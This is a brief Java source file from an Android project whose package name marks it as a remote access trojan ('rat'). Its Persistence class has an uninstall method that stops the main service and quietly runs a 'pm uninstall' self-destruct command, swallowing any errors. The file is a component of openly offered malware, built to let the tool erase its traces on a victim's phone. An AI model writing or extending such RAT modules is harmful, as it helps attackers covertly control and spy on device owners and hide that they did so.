package com.xroomjx.rat.modules;

import android.content.Context;
import android.content.Intent;

import com.xroomjx.rat.MainService;

public class Persistence {
    public static void uninstall(Context context) {
        try {
            context.stopService(new Intent(context, MainService.class));
            // Self-destruct via package manager (requires root or device admin)
            Runtime.getRuntime().exec("pm uninstall com.xroomjx.rat");
        } catch (Exception e) {
            // silent
        }
    }
}
